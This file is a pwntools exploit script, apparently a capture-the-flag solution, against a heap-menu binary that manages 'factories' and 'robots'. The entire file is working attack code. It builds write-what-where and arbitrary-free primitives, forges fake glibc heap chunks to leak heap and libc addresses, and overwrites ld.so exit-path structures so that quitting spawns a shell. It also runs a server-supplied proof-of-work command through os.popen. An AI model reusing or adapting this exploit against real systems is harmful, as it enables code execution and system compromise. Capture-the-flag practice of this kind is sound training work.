#!/usr/bin/env python
from pwn import *
from time import sleep
import os


exe = ELF("./main")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

sshc = None
r = None
nc = "nc 172.17.0.2 5000"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
SLEEP_TIME = 0.2

# Communication ----------------------------------------------------------
tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))

def sendl(x):
    sleep(SLEEP_TIME)
    r.sendline(tobytes(x))


def send(x):
    sleep(SLEEP_TIME)
    r.send(tobytes(x))


# Logging ----------------------------------------------------------------
def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


# Helpers ----------------------------------------------------------------
def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return b'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
        
        r.recvuntil(b"proof of work: ")
        cmd = r.readline().strip().decode()
        
        outbuf = os.popen(cmd)
        ans = outbuf.read().strip().encode()
        
        r.sendline(ans)
    
    return r


def create_factory(idx):
    idx = tobytes(idx)
    
    sendl(b"1")
    sendl(idx)
    
    r.recvuntil(b"7. quit\n")


def spawn_robot(fidx, ridx, name, creator, ref, desc):
    fidx = tobytes(fidx)
    ridx = tobytes(ridx)
    name = tobytes(name)
    creator = tobytes(creator)
    ref = tobytes(ref)
    desc = tobytes(desc)
    
    r.recvuntil(b"7. quit\n")
    
    sendl(b"2")
    sendl(fidx)
    sendl(ridx)
    
    if len(name) == 16:
        send(name)
    else:
        sendl(name)
    sendl(creator)
    sendl(ref)
    sendl(desc)


def fix_robot(fidx, ridx, name):
    fidx = tobytes(fidx)
    ridx = tobytes(ridx)
    name = tobytes(name)
    
    r.recvuntil(b"7. quit\n")
    
    sendl(b"3")
    sendl(fidx)
    r.recvuntil(b"actory index")
    sendl(ridx)
    r.recvuntil(b"robot index")
    
    if len(name) == 16:
        send(name)
    else:
        sendl(name)
    
    r.recvuntil(b"robot name")


def inspect_robot(fidx, ridx, t=False):
    fidx = tobytes(fidx)
    ridx = tobytes(ridx)
    
    r.recvuntil(b"7. quit\n")
    
    sendl(b"4")
    sendl(fidx)
    sendl(ridx)
    
    if t:
        r.interactive()
    
    r.recvuntil(b"robot name : ")
    name = r.readline().strip()
    
    r.recvuntil(b"robot creator: ")
    creator = r.readline().strip()
    
    r.recvuntil(b"robot reference: ")
    ref = r.readline().strip()
    
    r.recvuntil(b"robot_description: ")
    desc = r.readline().strip()
    return name, creator, ref, desc


def del_robot(fidx, ridx):
    fidx = tobytes(fidx)
    ridx = tobytes(ridx)
    
    r.recvuntil(b"7. quit\n")
    
    sendl(b"5")
    sendl(fidx)
    sendl(ridx)
    

def del_fact(fidx):
    fidx = tobytes(fidx)
    
    r.recvuntil(b"7. quit\n")
    
    sendl(b"6")
    sendl(fidx)


def writeWhatWhere(adr, data):
    assert len(data) <= 16, "Too long!"
    fix_robot(0, 0, p64(adr))
    fix_robot(0, 34, tobytes(data))


def arbFree(adr):
    fix_robot(0, 0, p64(adr))
    del_robot(0, 34)


def main():
    global r
    r = conn()
    
    create_factory(0)
    spawn_robot(0, 0, "\0"*8,"creator1", "ref1", "desc1")
    
    # Write a fake chunk headers, size 0x500 & prev in-use flag to avoid consolidation
    spawn_robot(0, 34, p64(0)+p64(0x501),"creator2", "ref2", "desc2")
    
    leak = inspect_robot(0, 0)[0]
    heap_leak = u64(leak.ljust(8, b"\0"))
    chunk_500 = heap_leak
    chunk_400 = chunk_500+0x500
    
    logh("chunk_500", chunk_500)
    logh("Heap leak", heap_leak)
        
    # Fake an other chunk to avoid top consolidation after we free.
    # Heap layout:
    #     Prev Chunk In Use
    #     chunk_500
    #     chunk_400
    writeWhatWhere(chunk_400, p64(0)+p64(0x401))
    # Write the top chunk size 
    writeWhatWhere(chunk_400+0x400, p64(0)+p64(0x20ba1-0x400-0x500))
    
    # Now free our fake chunk (chunk_500)
    arbFree(heap_leak+0x10)
    
    # Read main arena address & get libc base
    fix_robot(0, 0, p64(heap_leak+0x10))
    leak = inspect_robot(0, 34)[0]
    libc_leak = u64(leak.ljust(8, b"\0"))
    logh("libc_leak", libc_leak)

    libc_base = libc_leak - 0x219ce0
    ld_base = libc_base + 0x22d000 # Offset from docker, can be bruteforced if we don't have access
    
    logh("libc_base", libc_base)
    logh("ld_base", ld_base)
    
    pie_base_ptr = ld_base + 0x3b2e0
    rdi_ptr = ld_base + 0x3aa48
    
    # Write our "/bin/sh", "sh" should be enough too
    # Since we know the adr of rdi_ptr & can write 16 bytes, we'll write the adr of system here too, at rdi_ptr+8
    writeWhatWhere(rdi_ptr, b"sh" + b"\0"*6 + p64(libc_base+libc.symbols.system))
    
    # Change the mutex type!
    writeWhatWhere(rdi_ptr+0x10, p64(0x4)+p64(0))
    
    # Calc the offset to be written instead of the base
    controlled_ptr = rdi_ptr+8
    offset = controlled_ptr - 0x3d88
    logh("offset", offset)
    
    # Final touch
    writeWhatWhere(pie_base_ptr, p64(offset))

    sendl(7) # exit, get me a shell
    
    r.interactive()


if __name__ == "__main__":
    main()

